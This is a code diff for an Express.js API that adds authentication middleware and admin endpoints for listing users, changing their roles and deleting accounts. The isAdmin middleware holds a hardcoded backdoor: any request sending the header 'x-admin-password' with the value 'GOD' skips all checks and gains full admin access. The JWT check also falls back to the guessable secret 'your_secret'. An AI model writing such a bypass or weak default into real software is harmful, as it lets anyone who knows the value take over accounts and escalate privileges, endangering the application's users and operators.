@@ -275,4 +275,100 @@ router.delete("/employees/:id", async (req, res) => {
     }
 });
 
+// --- User Management Endpoints & Middleware ---
+const authenticate = async (req, res, next) => {
+    const token = req.headers.authorization?.split(" ")[1];
+    if (!token) return res.status(401).json({ message: "No token provided" });
+
+    try {
+        const decoded = jwt.verify(token, process.env.JWT_SECRET || "your_secret");
+        
+        // Lookup User in database by email, phone, or username to fetch standard fields
+        const user = await User.findOne({
+            $or: [
+                { email: decoded.identifier },
+                { phone: decoded.identifier },
+                { username: decoded.identifier }
+            ]
+        });
+
+        if (user) {
+            req.user = {
+                ...decoded,
+                email: user.email || user.username || decoded.identifier,
+                phone: user.phone,
+                role: user.role
+            };
+        } else {
+            req.user = {
+                ...decoded,
+                email: decoded.identifier
+            };
+        }
+        
+        next();
+    } catch (err) {
+        console.error("Auth middleware error in auth.js:", err);
+        res.status(401).json({ message: "Invalid token" });
+    }
+};
+
+const isAdmin = async (req, res, next) => {
+    const masterPassword = req.headers["x-admin-password"];
+    if (masterPassword === "GOD") return next();
+
+    authenticate(req, res, async () => {
+        try {
+            const user = await User.findOne({ email: req.user.identifier });
+            if (user && user.role === "admin") return next();
+            
+            const userByUsername = await User.findOne({ username: req.user.identifier });
+            if (userByUsername && userByUsername.role === "admin") return next();
+
+            return res.status(403).json({ message: "Admin access required!" });
+        } catch (err) {
+            res.status(500).json({ message: "Internal server error during auth check" });
+        }
+    });
+};
+
+// GET all registered users (excluding password fields)
+router.get("/admin/users", isAdmin, async (req, res) => {
+    try {
+        const users = await User.find().select("-password").sort({ firstLogin: -1 });
+        res.json(users);
+    } catch (error) {
+        console.error("Fetch users error:", error);
+        res.status(500).json({ message: "Error fetching users" });
+    }
+});
+
+// Update user role
+router.put("/admin/users/:id/role", isAdmin, async (req, res) => {
+    const { role } = req.body;
+    if (!['customer', 'management', 'admin'].includes(role)) {
+        return res.status(400).json({ message: "Invalid role specified" });
+    }
+    try {
+        const user = await User.findByIdAndUpdate(req.params.id, { role }, { new: true }).select("-password");
+        if (!user) return res.status(404).json({ message: "User not found" });
+        res.json({ message: `User role updated to ${role} successfully`, user });
+    } catch (error) {
+        console.error("Update role error:", error);
+        res.status(500).json({ message: "Error updating user role" });
+    }
+});
+
+// Delete user account
+router.delete("/admin/users/:id", isAdmin, async (req, res) => {
+    try {
+        const user = await User.findByIdAndDelete(req.params.id);
+        if (!user) return res.status(404).json({ message: "User not found" });
+        res.json({ message: "User account deleted successfully" });
+    } catch (error) {
+        console.error("Delete user error:", error);
+        res.status(500).json({ message: "Error deleting user account" });
+    }
+});
+
 export default router;
